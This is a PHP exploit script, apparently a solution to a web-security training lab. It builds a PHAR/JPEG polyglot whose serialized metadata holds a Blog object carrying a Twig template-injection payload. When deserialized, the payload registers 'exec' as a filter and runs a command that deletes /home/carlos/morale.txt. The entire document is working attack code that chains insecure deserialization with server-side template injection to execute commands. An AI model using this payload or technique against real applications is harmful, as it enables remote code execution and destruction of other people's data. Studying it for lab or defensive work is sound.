<?php

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}

$user = "user";
$desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';

$blog = new Blog($user, $desc);

echo serialize($blog) ;

$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.jpeg', 'text');
$phar->setStub(file_get_contents("tom.jpeg")."<?php __HALT_COMPILER(); ?>");

$phar->setMetadata($blog);
$phar->stopBuffering();


?>